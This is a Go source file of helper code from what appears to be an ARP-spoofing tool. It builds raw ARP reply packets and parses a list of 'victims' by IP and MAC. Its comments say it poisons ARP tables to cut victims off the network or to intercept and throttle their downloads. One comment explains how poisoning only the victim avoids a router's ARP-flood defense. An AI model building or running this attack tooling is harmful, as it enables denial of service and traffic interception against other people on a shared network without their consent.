// Portable, syscall-free ARP helpers — split out from main.go (which is
// Linux/AF_PACKET only) so this logic compiles and unit-tests on any host.
package main

import (
	"encoding/binary"
	"fmt"
	"net"
	"os"
	"strings"
)

const (
	ethPARP    = 0x0806
	arphrdEth  = 1
	arpRequest = 1
	arpReply   = 2
)

func htons(v uint16) uint16 { return v<<8 | v>>8 }

// arpBody builds the 28-byte Ethernet/IPv4 ARP payload.
func arpBody(op uint16, senderMac net.HardwareAddr, senderIP net.IP, targetMac net.HardwareAddr, targetIP net.IP) []byte {
	p := make([]byte, 28)
	binary.BigEndian.PutUint16(p[0:], arphrdEth) // htype: Ethernet
	binary.BigEndian.PutUint16(p[2:], 0x0800)    // ptype: IPv4
	p[4] = 6                                      // hlen
	p[5] = 4                                      // plen
	binary.BigEndian.PutUint16(p[6:], op)        // oper
	copy(p[8:14], senderMac)
	copy(p[14:18], senderIP.To4())
	copy(p[18:24], targetMac)
	copy(p[24:28], targetIP.To4())
	return p
}

type victim struct {
	ip  net.IP
	mac net.HardwareAddr
	// both=true poisons victim<->gateway (needed to intercept the download for
	// throttling). both=false poisons ONLY the victim (a pure cut): the victim
	// sends its uplink to us and we drop it, so the gateway's ARP table is never
	// touched. That keeps our MAC from claiming many IPs at once, which is what
	// trips a router's ARP-flood defense and gets THIS phone isolated.
	both bool
}

func mustMAC(s string) net.HardwareAddr {
	m, err := net.ParseMAC(s)
	if err != nil {
		fmt.Fprintf(os.Stderr, "bad mac %q: %v\n", s, err)
		os.Exit(2)
	}
	return m
}

// parseVictims parses "ip@mac[@mode]" args. mode "v" = poison victim only (cut);
// anything else (incl. absent) = both directions (throttle). A malformed entry
// is skipped rather than fatal, so one bad target can't take down the whole cut.
func parseVictims(args []string) []victim {
	var vs []victim
	for _, t := range args {
		parts := strings.SplitN(t, "@", 3)
		if len(parts) < 2 {
			continue
		}
		ip := net.ParseIP(parts[0])
		mac, err := net.ParseMAC(parts[1])
		if ip == nil || ip.To4() == nil || err != nil {
			continue
		}
		both := !(len(parts) == 3 && parts[2] == "v")
		vs = append(vs, victim{ip, mac, both})
	}
	return vs
}
